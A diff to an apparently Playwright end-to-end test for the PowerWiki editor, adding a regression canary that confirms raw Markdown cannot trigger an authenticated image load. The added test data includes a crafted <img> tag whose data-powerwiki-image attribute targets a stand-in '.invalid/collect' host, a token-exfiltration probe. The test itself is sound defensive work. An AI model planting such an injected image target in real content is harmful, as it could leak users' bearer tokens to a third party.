@@ -103,6 +103,17 @@ page.on("console", (m) => {
     consoleErrors.push(m.text());
   }
 });
+// A reserved non-resolving destination used to prove that raw Markdown cannot
+// reach PowerWiki's authenticated image loader. It is deliberately never
+// contacted: if a regression causes a request, the test fails before any real
+// third-party endpoint can receive a bearer token.
+const tokenLeakProbeUrl = "https://powerwiki-token-leak.invalid/collect";
+let tokenLeakProbeRequested = false;
+page.on("request", (request) => {
+  if (request.url() === tokenLeakProbeUrl) {
+    tokenLeakProbeRequested = true;
+  }
+});
 const failedResponses = [];
 let attachmentResp = null;
 const uploadedAttachments = [];
@@ -369,7 +380,9 @@ try {
     await frame.waitForSelector(".wiki-editor-mode-select", { timeout: 30000 });
     await frame.selectOption(".wiki-editor-mode-select", "splitCode");
     await frame.waitForSelector(".wiki-editor-split-pane-code .monaco-editor", { timeout: 30000 });
-    const testMd = "# Heading One\n\n> [!NOTE]\n> A note callout.\n\n```ts\nconst answer: number = 42;\n```\n";
+    const testMd =
+      "# Heading One\n\n> [!NOTE]\n> A note callout.\n\n```ts\nconst answer: number = 42;\n```\n\n" +
+      `<img alt="token-leak probe" data-powerwiki-image="${tokenLeakProbeUrl}">`;
     await frame.evaluate((value) => {
       const models = window.monaco && window.monaco.editor ? window.monaco.editor.getModels() : [];
       if (models[0]) {
@@ -380,6 +393,20 @@ try {
     const preview = ".wiki-editor-split-pane-preview .markdown-preview";
     await frame.waitForSelector(`${preview} .powerwiki-callout-note`, { timeout: 30000 });
     check(true, "callout renders in the preview");
+    const tokenLeakGuard = await frame.evaluate(() => {
+      const image = document.querySelector('img[alt="token-leak probe"]');
+      return {
+        exists: !!image,
+        authenticatedTarget: image?.getAttribute("data-powerwiki-image") ?? null,
+      };
+    });
+    // The host-unit tests prove rejection happens before SDK.getAccessToken().
+    // This canary check proves raw author HTML is also removed in the deployed
+    // renderer, so it cannot enter that host path in the first place.
+    check(
+      tokenLeakGuard.exists && tokenLeakGuard.authenticatedTarget === null && !tokenLeakProbeRequested,
+      "crafted image target is stripped and never requested (no token-leak path)"
+    );
     check(!!(await frame.$(`${preview} .powerwiki-heading-anchor`)), "heading permalink anchor present");
     check(!!(await frame.$(`${preview} pre .powerwiki-copy-code`)), "copy-code button present");
     await frame.waitForSelector(`${preview} pre code.hljs`, { timeout: 15000 });
@@ -699,6 +726,13 @@ try {
     check(
       queryIds.plain > 0 && queryIds.richInTable === 0,
       `query id column uses plain links, not badges (plain=${queryIds.plain}, richInTable=${queryIds.richInTable})`
+    );
+    const nativeQueryUrl = await frame
+      .$eval(".powerwiki-query-table a[target='_blank']", (link) => link.getAttribute("href") ?? "")
+      .catch(() => "");
+    check(
+      nativeQueryUrl.startsWith(`${COLLECTION_URL}/${PROJECT}/_queries/query/`),
+      `query native link preserves the host collection URL (${JSON.stringify(nativeQueryUrl)})`
     );
     await page.screenshot({ path: path.join(ARTIFACTS_DIR, "08-query-ids.png") });
   } catch (error) {
